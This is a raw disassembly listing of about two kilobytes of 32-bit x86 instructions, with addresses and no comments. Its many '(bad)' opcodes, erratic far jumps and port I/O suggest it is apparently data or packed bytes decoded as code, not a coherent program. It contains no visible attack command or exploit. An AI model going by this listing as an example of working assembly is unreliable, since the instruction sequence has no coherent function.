  41c95d:	les    eax,FWORD PTR [edx]
  41c95f:	imul   esi,ebx,0x6fa3b26c
  41c965:	and    edx,edx
  41c967:	enter  0xe499,0x64
  41c96b:	add    al,0xc7
  41c96d:	daa    
  41c96e:	mov    ch,0xf9
  41c970:	loopne 0x41c9ba
  41c972:	scas   al,BYTE PTR es:[edi]
  41c973:	mov    ch,0x19
  41c975:	ficom  DWORD PTR [ebx-0x1e]
  41c978:	nop
  41c979:	(bad)  
  41c97a:	jecxz  0x41c975
  41c97c:	mov    edx,0xe11719c2
  41c981:	sub    eax,0xa5eabd42
  41c986:	add    al,0x8
  41c988:	(bad)  
  41c989:	jge    0x41c97c
  41c98b:	das    
  41c98c:	cwde   
  41c98d:	lock sub al,0xec
  41c991:	or     ch,BYTE PTR [esp+ebx*1+0x6f]
  41c995:	js     0x41c9c5
  41c997:	adc    esi,DWORD PTR [ebp-0x35]
  41c99a:	mov    dh,dh
  41c99c:	int    0xa1
  41c99e:	sub    BYTE PTR [edx+0x18ec643f],al
  41c9a4:	add    cl,BYTE PTR [edi]
  41c9a6:	fnstcw WORD PTR [eax-0x5b]
  41c9a9:	mov    ch,0xc2
  41c9ab:	xchg   edx,eax
  41c9ac:	stc    
  41c9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ae:	add    al,0x42
  41c9b0:	sub    DWORD PTR [edi-0x3fe52de9],esi
  41c9b6:	and    BYTE PTR [esi+eax*1+0x16c11ada],dl
  41c9bd:	aaa    
  41c9be:	in     al,0xaf
  41c9c0:	push   es
  41c9c1:	xchg   BYTE PTR [esi-0x1e],ah
  41c9c4:	xlat   BYTE PTR ds:[ebx]
  41c9c5:	push   cs
  41c9c6:	xchg   esp,eax
  41c9c7:	push   edi
  41c9c8:	outs   dx,BYTE PTR ds:[esi]
  41c9c9:	inc    ebx
  41c9ca:	sub    dl,dh
  41c9cc:	fisub  WORD PTR ds:0x80f31f3d
  41c9d2:	rol    BYTE PTR [ecx+eiz*8],1
  41c9d5:	(bad)  
  41c9d6:	fsubr  DWORD PTR [ebx-0x37]
  41c9d9:	pop    ecx
  41c9da:	cmc    
  41c9db:	test   DWORD PTR [ecx],ecx
  41c9dd:	aam    0x33
  41c9df:	jmp    0x41ca10
  41c9e1:	js     0x41c9b9
  41c9e3:	push   ss
  41c9e4:	cmp    al,0x19
  41c9e6:	call   0xf47e:0xa978bba2
  41c9ed:	nop
  41c9ee:	and    BYTE PTR [ecx-0x4483d77a],ah
  41c9f4:	in     al,dx
  41c9f5:	xor    BYTE PTR [eax],bl
  41c9f7:	push   0x26918e41
  41c9fc:	inc    edi
  41c9fd:	push   esi
  41c9fe:	aas    
  41c9ff:	pop    esp
  41ca00:	pop    esi
  41ca01:	gs scas eax,DWORD PTR es:[edi]
  41ca03:	aam    0x43
  41ca05:	pusha  
  41ca06:	inc    esp
  41ca07:	mov    eax,0x5940d5cc
  41ca0c:	inc    edi
  41ca0d:	sub    DWORD PTR ss:[ecx-0x35fcdf31],edi
  41ca14:	loopne 0x41ca71
  41ca16:	mov    ah,0x88
  41ca18:	inc    eax
  41ca19:	jmp    0x702097e3
  41ca1e:	xor    BYTE PTR [edi+eax*2-0x22],dl
  41ca22:	push   ebx
  41ca23:	enter  0x42d9,0xe0
  41ca27:	pushf  
  41ca28:	sub    BYTE PTR [edi-0x3d],bh
  41ca2b:	das    
  41ca2c:	dec    edx
  41ca2d:	push   edx
  41ca2e:	jo     0x41ca05
  41ca30:	mov    cl,0xe2
  41ca32:	imul   esp,ebp,0x5b
  41ca35:	mov    edi,0x971300e0
  41ca3a:	pop    ecx
  41ca3b:	mov    esi,esp
  41ca3d:	adc    DWORD PTR [edx+0x50d3261d],edi
  41ca43:	jecxz  0x41ca68
  41ca45:	fucom  st(3)
  41ca47:	test   BYTE PTR [ecx-0x72],al
  41ca4a:	sub    cl,0xa9
  41ca4d:	push   ecx
  41ca4e:	mov    ch,BYTE PTR [eax]
  41ca50:	mov    ebp,DWORD PTR [ecx-0x3c]
  41ca53:	int3   
  41ca54:	push   es
  41ca55:	mov    es,WORD PTR [edx]
  41ca57:	ret    
  41ca58:	jl     0x41caaf
  41ca5a:	ficomp DWORD PTR [esi-0xf]
  41ca5d:	jle    0x41ca2f
  41ca5f:	dec    ebp
  41ca60:	and    al,0xde
  41ca62:	ss or  cl,cl
  41ca65:	xchg   ebx,eax
  41ca66:	xlat   BYTE PTR ds:[ebx]
  41ca67:	sub    DWORD PTR [edx+edx*4+0x7a],eax
  41ca6b:	dec    ebp
  41ca6c:	cmp    DWORD PTR es:[eax],edi
  41ca6f:	scas   al,BYTE PTR es:[edi]
  41ca70:	bnd js 0x41ca1f
  41ca73:	and    BYTE PTR [edi+0x1234f128],cl
  41ca79:	ss (bad) 
  41ca7b:	sahf   
  41ca7c:	mov    es,WORD PTR [ecx]
  41ca7e:	es jle 0x41ca43
  41ca81:	cld    
  41ca82:	ins    DWORD PTR es:[edi],dx
  41ca83:	idiv   DWORD PTR [edi+0x4d]
  41ca86:	and    ch,BYTE PTR [ecx-0x4]
  41ca89:	call   0x7c24e7ad
  41ca8e:	(bad)  
  41ca8f:	repz scas al,BYTE PTR es:[edi]
  41ca91:	daa    
  41ca92:	mov    DWORD PTR [ebp+0x16659277],esp
  41ca98:	inc    BYTE PTR ds:0x2efceaae
  41ca9e:	xchg   ecx,eax
  41ca9f:	sbb    eax,ebx
  41caa1:	jle    0x41caaf
  41caa3:	(bad)  
  41caa4:	push   edx
  41caa5:	push   eax
  41caa6:	out    dx,al
  41caa7:	sub    al,0x96
  41caa9:	jno    0x41ca2c
  41caab:	call   DWORD PTR [ecx+0x49]
  41caae:	lods   al,BYTE PTR ds:[esi]
  41caaf:	dec    esp
  41cab0:	add    al,0x90
  41cab2:	jns    0x41ca73
  41cab4:	jge    0x41ca74
  41cab6:	mov    ebx,0x7c096694
  41cabb:	xor    esp,DWORD PTR [esi]
  41cabd:	or     DWORD PTR [eax+edx*2-0xd21caa6],0xb535f33d
  41cac8:	nop
  41cac9:	rol    BYTE PTR [esi],cl
  41cacb:	sub    BYTE PTR [edi],dl
  41cacd:	test   al,0x67
  41cacf:	adc    esi,DWORD PTR [ecx-0x3]
  41cad2:	jb     0x41cb38
  41cad4:	dec    esp
  41cad5:	jp     0x41cae5
  41cad7:	mov    ah,al
  41cad9:	iret   
  41cada:	inc    ecx
  41cadb:	jl     0x41ca7b
  41cadd:	in     eax,0xb1
  41cadf:	add    eax,0xd3141f34
  41cae4:	and    dl,ch
  41cae6:	imul   ecx,DWORD PTR [esi],0x515b445e
  41caec:	mov    ds:0x4c83e535,eax
  41caf1:	fnclex 
  41caf3:	pop    ss
  41caf4:	sbb    DWORD PTR [esi],0x50
  41caf7:	and    ebp,DWORD PTR [ebx+0x36]
  41cafa:	out    dx,eax
  41cafb:	pop    edi
  41cafc:	pop    edx
  41cafd:	aad    0x7
  41caff:	loope  0x41cb74
  41cb01:	out    0x30,al
  41cb03:	xor    al,0x8f
  41cb05:	adc    DWORD PTR [esi-0x73],ebp
  41cb08:	sbb    DWORD PTR [esi],0x45b8c5fe
  41cb0e:	leave  
  41cb0f:	push   0xfffffff1
  41cb11:	jle    0x41cb0e
  41cb13:	nop
  41cb14:	or     al,0x1e
  41cb16:	push   cs
  41cb17:	sub    bh,BYTE PTR [eax+0x26]
  41cb1a:	shl    DWORD PTR [eax-0x69],0xf1
  41cb1e:	sbb    BYTE PTR [edi-0x237d7fc1],bl
  41cb24:	lds    ebp,FWORD PTR [eax]
  41cb26:	xlat   BYTE PTR ds:[ebx]
  41cb27:	sbb    DWORD PTR [ecx-0x4cb00c0d],esi
  41cb2d:	sbb    cl,BYTE PTR [eax]
  41cb2f:	call   0x36bd:0x74c95fb5
  41cb36:	out    dx,al
  41cb37:	mov    cl,0x1e
  41cb39:	pop    ebp
  41cb3a:	and    edx,DWORD PTR [ecx-0x78425821]
  41cb40:	int3   
  41cb41:	ffreep st(2)
  41cb43:	jg     0x41cae0
  41cb45:	cmova  ebp,DWORD PTR [edi]
  41cb48:	retf   0x8c9b
  41cb4b:	jecxz  0x41cb30
  41cb4d:	test   eax,0x1d589b12
  41cb52:	pop    esp
  41cb53:	dec    edx
  41cb54:	inc    esp
  41cb55:	push   ebp
  41cb56:	sbb    DWORD PTR [ebp-0x33],edi
  41cb59:	cs sbb al,0x3a
  41cb5c:	mov    al,ds:0x7b1df983
  41cb61:	loopne 0x41cb0c
  41cb63:	push   ebx
  41cb64:	aas    
  41cb65:	or     al,0x2d
  41cb67:	shl    DWORD PTR [ebx],1
  41cb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb6a:	ss es icebp 
  41cb6d:	mov    al,ds:0x57c90f18
  41cb72:	xor    ah,dl
  41cb74:	scas   eax,DWORD PTR es:[edi]
  41cb75:	mov    bl,0x2d
  41cb77:	or     BYTE PTR [eax],ah
  41cb79:	dec    ebp
  41cb7a:	scas   eax,DWORD PTR es:[edi]
  41cb7b:	and    al,0x73
  41cb7d:	les    esi,FWORD PTR [ebx+0x16]
  41cb80:	fimul  WORD PTR [esi+0x96ab5c6]
  41cb86:	(bad)  
  41cb87:	mov    al,ds:0x19447f24
  41cb8c:	inc    edi
  41cb8d:	inc    ecx
  41cb8e:	loopne 0x41cbf1
  41cb90:	or     al,0xc0
  41cb92:	push   eax
  41cb93:	jne    0x41cb8f
  41cb95:	sub    DWORD PTR ds:0x82f54a7f,ebp
  41cb9b:	xlat   BYTE PTR ds:[ebx]
  41cb9c:	xor    DWORD PTR [edx-0x6],0x6
  41cba0:	jge    0x41cbc3
  41cba2:	(bad)  
  41cba3:	popa   
  41cba4:	mov    ebp,0x875b58f2
  41cba9:	cmpps  xmm0,XMMWORD PTR [esi-0x58952f36],0x37
  41cbb1:	in     al,dx
  41cbb2:	jle    0x41cbd3
  41cbb4:	ret    
  41cbb5:	scas   al,BYTE PTR es:[edi]
  41cbb6:	push   ss
  41cbb7:	fnstsw WORD PTR [ecx]
  41cbb9:	test   BYTE PTR [ebx+0x1845f931],ah
  41cbbf:	jmp    FWORD PTR [ebp-0x4f65cb7c]
  41cbc5:	cmp    al,0x27
  41cbc7:	sub    ebx,DWORD PTR [ecx]
  41cbc9:	lock loope 0x41cc34
  41cbcc:	mov    dh,0x35
  41cbce:	mov    esp,0x6be211db
  41cbd3:	ret    0x539f
  41cbd6:	je     0x41cb5d
  41cbd8:	lock imul ebp,DWORD PTR [edx-0x5361d3c8],0x4876e2bf
  41cbe3:	popa   
  41cbe4:	sbb    BYTE PTR [edi],dl
  41cbe6:	jnp    0x41cc4f
  41cbe8:	xchg   edi,eax
  41cbe9:	aad    0xe0
  41cbeb:	fld    TBYTE PTR [ecx]
  41cbed:	arpl   WORD PTR ds:0x87091f0d,di
  41cbf3:	adc    DWORD PTR [ecx+0x7f113ea1],ebx
  41cbf9:	call   0xe07483e
  41cbfe:	jne    0x41cbd6
  41cc00:	adc    edi,DWORD PTR [edi+eax*1-0x3381a732]
  41cc07:	adc    eax,0x5e9c75b
  41cc0c:	cmp    DWORD PTR [edx+0xc14fd7d],ecx
  41cc12:	shl    BYTE PTR [esi],1
  41cc14:	pop    eax
  41cc15:	jle    0x41cc8b
  41cc17:	clc    
  41cc18:	call   0x19e6731a
  41cc1d:	aaa    
  41cc1e:	mov    edx,0x64a5dd92
  41cc23:	mov    edi,0xcfba7045
  41cc28:	push   cs
  41cc29:	adc    eax,0x3f34ff52
  41cc2e:	xor    BYTE PTR ds:0x3aa0488b,ch
  41cc34:	fwait
  41cc35:	jo     0x41cc8f
  41cc37:	add    DWORD PTR [ebp-0xc105f8f],ebp
  41cc3d:	mov    ds,ebx
  41cc3f:	pop    ds
  41cc40:	adc    cl,BYTE PTR [esi+0x68ef1b48]
  41cc46:	adc    al,0x61
  41cc48:	xchg   BYTE PTR [ebx+0x3979f92b],dl
  41cc4e:	(bad)  
  41cc4f:	enter  0xb25c,0x67
  41cc53:	shl    BYTE PTR [ebx+edi*4-0x34],1
  41cc57:	xchg   edi,eax
  41cc58:	call   0xaac7cc2c
  41cc5d:	je     0x41cc51
  41cc5f:	mov    ebx,0xe7d6c4ae
  41cc64:	or     ebx,edx
  41cc66:	out    0x11,eax
  41cc68:	sahf   
  41cc69:	rol    DWORD PTR [eax-0x57],0x61
  41cc6d:	ds stos BYTE PTR es:[edi],al
  41cc6f:	mov    al,0xdf
  41cc71:	call   0xa7d7:0xe3b03f0b
  41cc78:	mov    eax,ds:0x567711f6
  41cc7d:	mov    edx,edx
  41cc7f:	out    0xa0,al
  41cc81:	push   edi
  41cc82:	je     0x41cc4a
  41cc84:	aas    
  41cc85:	lds    esi,FWORD PTR [eax+eax*4]
  41cc88:	adc    DWORD PTR [ecx],0x51c46ea0
  41cc8e:	loope  0x41cc96
  41cc90:	pop    ss
  41cc91:	sbb    DWORD PTR ds:0xb626e701,esp
  41cc97:	stos   DWORD PTR es:[edi],eax
  41cc98:	fisttp WORD PTR [edi+0x3b2f1734]
  41cc9e:	xchg   esi,eax
  41cc9f:	sti    
  41cca0:	mov    BYTE PTR [eax+0x4e],bl
  41cca3:	inc    eax
  41cca4:	scas   al,BYTE PTR es:[edi]
  41cca5:	xor    eax,0xaa015e01
  41ccaa:	mov    ds:0x24991652,eax
  41ccaf:	addr16 addr16 enter 0xfc0c,0x63
  41ccb5:	jno    0x41ccea
  41ccb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb8:	inc    eax
  41ccb9:	or     BYTE PTR [edi],al
  41ccbb:	sbb    eax,0x34f12a29
  41ccc0:	cwde   
  41ccc1:	jns    0x41ccc2
  41ccc3:	mov    edi,0x9b5898e
  41ccc8:	lahf   
  41ccc9:	imul   ebp,DWORD PTR [edx-0x5e],0xffffffbc
  41cccd:	test   al,0x79
  41cccf:	mov    edx,ebp
  41ccd1:	mov    edi,gs
  41ccd3:	fsub   QWORD PTR ss:[esi+0x11]
  41ccd7:	(bad)  
  41ccd8:	and    cl,dh
  41ccda:	mov    WORD PTR [edx],ss
  41ccdc:	(bad)  
  41ccdd:	mov    al,0x3d
  41ccdf:	xchg   BYTE PTR [edi],ah
  41cce1:	mov    cl,0x3e
  41cce3:	push   eax
  41cce4:	stos   BYTE PTR es:[edi],al
  41cce5:	push   ebx
  41cce6:	lods   al,BYTE PTR ds:[esi]
  41cce7:	fstp   TBYTE PTR [edx]
  41cce9:	inc    edx
  41ccea:	dec    edi
  41cceb:	push   ebp
  41ccec:	push   ecx
  41cced:	rol    ch,1
  41ccef:	test   al,0xa9
  41ccf1:	or     edx,DWORD PTR [edx+0x52]
  41ccf4:	sub    esp,DWORD PTR [ecx]
  41ccf6:	jbe    0x41cccb
  41ccf8:	ja     0x41cc90
  41ccfa:	cs (bad) 
  41ccfc:	pop    ss
  41ccfd:	call   0xb100:0x439fe3d
  41cd04:	jne    0x41ccd9
  41cd06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd07:	imul   DWORD PTR [eax-0x29]
  41cd0a:	push   ds
  41cd0b:	aam    0x8
  41cd0d:	jmp    0x41cca7
  41cd0f:	cmp    BYTE PTR [esi-0x2c],bh
  41cd12:	sbb    eax,0x50461f79
  41cd17:	pop    ebx
  41cd18:	(bad)  
  41cd19:	call   0xb9981a00
  41cd1e:	ins    BYTE PTR es:[edi],dx
  41cd1f:	mov    ah,0x18
  41cd21:	pop    edx
  41cd22:	call   0x4379:0xff87c4d5
  41cd29:	hlt    
  41cd2a:	mov    al,BYTE PTR [edi]
  41cd2c:	cmp    esi,eax
  41cd2e:	ror    BYTE PTR [ecx-0x24],cl
  41cd31:	push   esi
  41cd32:	inc    ebx
  41cd33:	xor    BYTE PTR [esi-0x64],ah
  41cd36:	cmp    al,0x44
  41cd38:	jno    0x41cd3a
  41cd3a:	mov    ds:0xf5017a90,al
  41cd3f:	and    BYTE PTR [edi+0x34],dh
  41cd42:	(bad)  
  41cd43:	js     0x41cd5d
  41cd45:	sub    DWORD PTR [edx+0x5],edx
  41cd48:	scas   al,BYTE PTR es:[edi]
  41cd49:	pop    ds
  41cd4a:	xchg   BYTE PTR [ecx+0x5573e6ea],ch
  41cd50:	leave  
  41cd51:	jne    0x41ccde
  41cd53:	shl    BYTE PTR [esi+0x76],cl
  41cd56:	xchg   BYTE PTR [eax],dh
  41cd58:	lods   eax,DWORD PTR ds:[esi]
  41cd59:	inc    ebp
  41cd5a:	push   edi
  41cd5b:	push   cs
  41cd5c:	dec    edx
  41cd5d:	dec    esi
  41cd5e:	add    DWORD PTR [eax],ebp
  41cd60:	sub    DWORD PTR [ebx+0x46],edi
  41cd63:	add    eax,0xeff60b2f
  41cd68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd69:	dec    esi
  41cd6a:	bound  ebp,QWORD PTR [eax-0x6f]
  41cd6d:	xlat   BYTE PTR ds:[ebx]
  41cd6e:	cmp    DWORD PTR [edx+ebp*8+0x936d14b],edx
  41cd75:	enter  0x69cc,0x87
  41cd79:	mov    bl,0xd2
  41cd7b:	push   ds
  41cd7c:	fisttp QWORD PTR [esi+0x3cfd8f5]
  41cd82:	xor    DWORD PTR [ecx],esp
  41cd84:	sub    DWORD PTR [ebp-0x396f9164],0xa
  41cd8b:	in     al,0xd8
  41cd8d:	out    0xa3,al
  41cd8f:	ins    BYTE PTR es:[edi],dx
  41cd90:	rol    BYTE PTR [esi+0x40],1
  41cd93:	lds    ebx,FWORD PTR [ebp-0x64]
  41cd96:	add    eax,edx
  41cd98:	iret   
  41cd99:	enter  0x868b,0x9a
  41cd9d:	lea    eax,ds:0xe7a5b0c1
  41cda3:	inc    BYTE PTR ds:0x14c6108d
  41cda9:	sub    BYTE PTR [esi+0x64],bh
  41cdac:	mov    ebp,0x3dc77ab0
  41cdb1:	sub    ebp,0x4d6506a7
  41cdb7:	pop    ss
  41cdb8:	xor    BYTE PTR [edx+0x2b],0xea
  41cdbc:	adc    BYTE PTR [esi-0x2c948efb],bl
  41cdc2:	add    al,0x83
  41cdc4:	fsub   DWORD PTR [edi]
  41cdc6:	adc    BYTE PTR ds:0xe48868d1,ch
  41cdcc:	jecxz  0x41cd62
  41cdce:	xor    DWORD PTR [ebx-0x342b0964],esi
  41cdd4:	int    0x78
  41cdd6:	(bad)  
  41cdd7:	or     BYTE PTR [edi-0x50767e71],ah
  41cddd:	mov    eax,0x9c44cdb7
  41cde2:	mov    ebx,fs
  41cde4:	mov    ds:0x44a55825,eax
  41cde9:	shr    BYTE PTR [edi+0x15fc86d8],1
  41cdef:	pop    edx
  41cdf0:	pop    eax
  41cdf1:	mov    ecx,0xfc2091aa
  41cdf6:	(bad)  
  41cdf7:	dec    ebx
  41cdf8:	daa    
  41cdf9:	stc    
  41cdfa:	sbb    DWORD PTR [edx+0x4fd2875c],esi
  41ce00:	xchg   esi,eax
  41ce01:	inc    esi
  41ce02:	fsub   QWORD PTR [eax+eax*2]
  41ce05:	sub    DWORD PTR ds:0xc7feb6b8,ecx
  41ce0b:	pop    edi
  41ce0c:	add    DWORD PTR [edi+0x44],esp
  41ce0f:	xor    eax,0x417c9182
  41ce14:	sub    al,BYTE PTR [ecx]
  41ce16:	add    eax,0x5a728e9d
  41ce1b:	pop    ss
  41ce1c:	cwde   
  41ce1d:	mov    ds:0xe5501622,eax
  41ce22:	sub    BYTE PTR [esi],0xeb
  41ce25:	mov    al,0xaa
  41ce27:	mov    BYTE PTR [ebx-0x48d23c13],cl
  41ce2d:	inc    edi
  41ce2e:	jns    0x41ce99
  41ce30:	sbb    al,dh
  41ce32:	adc    esi,DWORD PTR [eax+ebp*2]
  41ce35:	(bad)  
  41ce36:	adc    eax,0x1219d250
  41ce3b:	out    dx,eax
  41ce3c:	pop    eax
  41ce3d:	retf   
  41ce3e:	ret    0x5542
  41ce41:	xor    esp,DWORD PTR [ebp+eiz*1+0x5611b202]
  41ce48:	loop   0x41ce8a
  41ce4a:	cwde   
  41ce4b:	add    DWORD PTR [ecx+0xd],0x20
  41ce4f:	fmul   QWORD PTR [ebp+0x2d52d264]
  41ce55:	and    BYTE PTR [eax],0x13
  41ce58:	or     ch,BYTE PTR [ebp+0x14]
  41ce5b:	pop    esp
  41ce5c:	and    edi,DWORD PTR [ebp-0x47f100f3]
  41ce62:	sbb    dh,bl
  41ce64:	xchg   edi,eax
  41ce65:	push   ebp
  41ce66:	sbb    DWORD PTR [ecx-0x59cb00a3],edi
  41ce6c:	idiv   BYTE PTR [edx+edx*2]
  41ce6f:	cdq    
  41ce70:	or     BYTE PTR [esi+0x15],al
  41ce73:	xor    BYTE PTR [edx+esi*8+0x73c1ee59],bh
  41ce7a:	lods   eax,DWORD PTR ds:[esi]
  41ce7b:	add    DWORD PTR [ecx-0xe],esp
  41ce7e:	bnd call 0x301b2f3
  41ce84:	and    al,0xe6
  41ce86:	add    eax,0xf198be6f
  41ce8b:	popf   
  41ce8c:	inc    esi
  41ce8d:	jns    0x41ce87
  41ce8f:	daa    
  41ce90:	xchg   esi,eax
  41ce91:	gs sbb bh,dl
  41ce94:	icebp  
  41ce95:	mov    ds:0xb54b318b,eax
  41ce9a:	sub    eax,0x96199cc1
  41ce9f:	jo     0x41cec0
  41cea1:	and    al,0xe4
  41cea3:	dec    esp
  41cea4:	adc    ebx,0x847d4feb
  41ceaa:	test   al,0x21
  41ceac:	xor    ebx,DWORD PTR [ebp+ebp*4-0x6c01d5f2]
  41ceb3:	fs nop
  41ceb5:	jno    0x41cf13
  41ceb7:	rcl    BYTE PTR [ecx+0x2f5c4452],1
  41cebd:	mov    ds:0x89353bf0,eax
  41cec2:	mov    ss,WORD PTR [edi]
  41cec4:	adc    bh,BYTE PTR [edi]
  41cec6:	xor    BYTE PTR [ebx],dh
  41cec8:	das    
  41cec9:	inc    esp
  41ceca:	popf   
  41cecb:	std    
  41cecc:	add    al,0xad
  41cece:	jbe    0x41cf3c
  41ced0:	add    cl,BYTE PTR [ebx+0x4b]
  41ced3:	idiv   DWORD PTR [eax+ebp*8-0x14]
  41ced7:	sub    eax,0xa95dc44d
  41cedc:	in     eax,dx
  41cedd:	jg     0x41ce7c
  41cedf:	popf   
  41cee0:	fldenv [edi]
  41cee2:	pop    ds
  41cee3:	mov    cl,0x8c
  41cee5:	push   edx
  41cee6:	jg     0x41cef0
  41cee8:	push   esp
  41cee9:	sbb    bl,BYTE PTR [ecx]
  41ceeb:	in     eax,0x80
  41ceed:	rol    DWORD PTR [edi],0xe3
  41cef0:	je     0x41cf44
  41cef2:	sbb    DWORD PTR [si],0xffffffa7
  41cef6:	or     al,0x7d
  41cef8:	loopne 0x41cead
  41cefa:	inc    edi
  41cefb:	(bad)  
  41cefd:	pop    edi
  41cefe:	inc    esp
  41ceff:	mov    ebx,0x6e6fb27a
  41cf04:	iret   
  41cf05:	add    BYTE PTR [ebx],0xc8
  41cf08:	mov    BYTE PTR [edi],ah
  41cf0a:	mov    al,ds:0xfb73c790
  41cf0f:	loop   0x41cee9
  41cf11:	fstp   TBYTE PTR [eax+0x1402fa09]
  41cf17:	mov    ebp,0xebf0784e
  41cf1c:	xor    eax,0xa4025cf9
  41cf21:	out    dx,eax
  41cf22:	ja     0x41cf34
  41cf24:	push   ebx
  41cf25:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41cf27:	out    0x2b,eax
  41cf29:	sub    eax,0xd08a9587
  41cf2e:	push   edi
  41cf2f:	fucom  st(7)
  41cf31:	or     edx,DWORD PTR [eax+0x79]
  41cf34:	jne    0x41cf0a
  41cf36:	ror    BYTE PTR [edx+0x4979b54a],1
  41cf3c:	dec    eax
  41cf3d:	repz mov ecx,0xfb2cc4c8
  41cf43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf44:	shl    BYTE PTR ds:0xa4d6cf24,0xbe
  41cf4b:	inc    esi
  41cf4c:	sbb    DWORD PTR [ecx],ebp
  41cf4e:	sahf   
  41cf4f:	sub    BYTE PTR [edi],ah
  41cf51:	imul   edi,DWORD PTR [ebx+0x7f],0xf472a585
  41cf58:	retf   0x19cb
  41cf5b:	stos   BYTE PTR es:[edi],al
  41cf5c:	mov    dl,0xbd
  41cf5e:	repz mov ds:0x1f5d0a96,al
  41cf64:	pop    edx
  41cf65:	jns    0x41cf7f
  41cf67:	fwait
  41cf68:	outs   dx,BYTE PTR ds:[esi]
  41cf69:	xor    al,ch
  41cf6b:	(bad)
  41cf6f:	push   es
  41cf70:	push   0xf5117ae1
  41cf75:	retf   0xd20e
  41cf78:	mov    ch,0x4e
  41cf7a:	sbb    al,0xf
  41cf7c:	pusha  
  41cf7d:	xor    al,0x5f
  41cf7f:	into   
  41cf80:	ds mov al,0x65
  41cf83:	test   al,0xe
  41cf85:	xor    al,0x4a
  41cf88:	add    BYTE PTR [edx+0x134f5ea0],dl
  41cf8e:	adc    BYTE PTR [eax+0x18609515],bl
  41cf94:	jg     0x41cf68
  41cf96:	mov    dh,0x4
  41cf98:	loope  0x41cf3c
  41cf9a:	mov    al,0xc
  41cf9c:	lods   al,BYTE PTR ds:[esi]
  41cf9d:	add    al,0x95
  41cf9f:	sub    edi,DWORD PTR [eax-0x13a98e36]
  41cfa5:	add    bh,bl
  41cfa7:	sbb    BYTE PTR [edx],bh
  41cfa9:	push   edi
  41cfaa:	add    al,bh
  41cfac:	(bad)  
  41cfad:	out    dx,eax
  41cfae:	lods   eax,DWORD PTR ds:[esi]
  41cfaf:	stos   BYTE PTR es:[edi],al
  41cfb0:	push   ecx
  41cfb1:	inc    ebx
  41cfb2:	mov    edx,0xd54b74f4
  41cfb7:	pop    esp
  41cfb8:	push   esp
  41cfb9:	inc    ebp
  41cfba:	aaa    
  41cfbb:	clc    
  41cfbc:	mov    ds:0x8925f2c6,al
  41cfc1:	push   0x4a
  41cfc3:	add    eax,0xab92b298
  41cfc8:	xchg   DWORD PTR [edx-0x26],ecx
  41cfcb:	pop    ebx
  41cfcc:	cwde   
  41cfcd:	mov    esi,0x314e4231
  41cfd2:	push   ds
  41cfd3:	mov    esi,0x989ddc47
  41cfd8:	sahf   
  41cfd9:	cmp    DWORD PTR [ebx-0x24],ebp
  41cfdc:	aas    
  41cfdd:	bound  edi,QWORD PTR [esi+0x1b37526a]
  41cfe3:	xlat   BYTE PTR ds:[ebx]
  41cfe4:	pushf  
  41cfe5:	push   cs
  41cfe6:	mov    al,ds:0x84691ee2
  41cfeb:	mov    al,BYTE PTR [edi-0x57]
  41cfee:	push   esi
  41cfef:	xchg   ebp,eax
  41cff0:	xor    DWORD PTR [esi-0x34],edx
  41cff3:	mov    eax,0xb652b0c7
  41cff8:	in     al,dx
  41cff9:	mov    bl,BYTE PTR [edx]
  41cffb:	push   0x7f
  41cffd:	sub    DWORD PTR [ecx-0xa],edx
  41d000:	mov    ebx,0x8755ec5a
  41d005:	(bad)  
  41d006:	leave  
  41d007:	dec    esi
  41d008:	cmc    
  41d009:	adc    BYTE PTR [ecx],al
  41d00b:	push   ebp
  41d00c:	jns    0x41d02d
  41d00e:	and    al,0x8a
  41d010:	cdq    
  41d011:	inc    edi
  41d012:	adc    dh,bl
  41d014:	and    ecx,esi
  41d016:	je     0x41d091
  41d018:	popf   
  41d019:	sbb    al,0xdc
  41d01b:	gs push edx
  41d01d:	je     0x41d024
  41d01f:	jbe    0x41d054
  41d021:	pop    ds
  41d022:	cmp    esi,ebp
  41d024:	retf   
  41d025:	test   al,0xee
  41d027:	and    BYTE PTR [ebx-0x43f87b88],dl
  41d02d:	out    0xba,eax
  41d02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d030:	jbe    0x41d016
  41d032:	inc    eax
  41d033:	ins    DWORD PTR es:[edi],dx
  41d034:	sub    eax,0xd699700f
  41d039:	pusha  
  41d03a:	push   eax
  41d03b:	js     0x41d090
  41d03d:	jecxz  0x41cfe3
  41d03f:	jmp    0x41d092
  41d041:	xchg   ecx,eax
  41d042:	mov    ecx,ds
  41d044:	stos   DWORD PTR es:[edi],eax
  41d045:	daa    
  41d046:	jp     0x41d011
  41d048:	sti    
  41d049:	adc    eax,0x2480c8ba
  41d04e:	(bad)  
  41d04f:	pop    ecx
  41d050:	jecxz  0x41d009
  41d052:	in     eax,dx
  41d053:	or     eax,0x1e307d7f
  41d058:	xor    BYTE PTR [ebx-0x10],bh
  41d05b:	stos   BYTE PTR es:[edi],al
  41d05c:	pop    edx
  41d05d:	loop   0x41d0b3
  41d05f:	dec    edi
  41d060:	or     BYTE PTR [eax-0x27],al
  41d063:	aad    0xe7
  41d065:	and    eax,DWORD PTR [ebx-0x2efde01e]
  41d06b:	mov    bl,BYTE PTR [ebx+eax*1-0x70f5baf]
  41d072:	push   ebp
  41d073:	add    dh,ch
  41d075:	(bad)  
  41d076:	mov    ds:0xc2161d9,al
  41d07b:	int    0xde
  41d07d:	jecxz  0x41d0e9
  41d07f:	iret   
  41d080:	xor    al,0x6b
  41d082:	push   cs
  41d083:	ja     0x41d0ff
  41d085:	sbb    BYTE PTR [edx+0xf849f8f],bl
  41d08b:	vsubpd xmm7,xmm6,XMMWORD PTR [eax+edi*8]
  41d090:	mov    ebx,ebp
  41d092:	xor    dh,BYTE PTR [edi]
  41d094:	fwait
  41d095:	out    0x2f,eax
  41d097:	sub    al,0xb2
  41d09a:	inc    edi
  41d09b:	aaa    
  41d09c:	hlt    
  41d09d:	cmp    dl,al
  41d09f:	in     eax,dx
  41d0a0:	int3   
  41d0a1:	jmp    0x4f61:0x3ce6978e
  41d0a8:	ins    DWORD PTR es:[edi],dx
  41d0a9:	aas    
  41d0aa:	push   es
  41d0ab:	cdq    
  41d0ac:	(bad)  
  41d0ad:	retf   0xc03d
  41d0b0:	jae    0x41d050
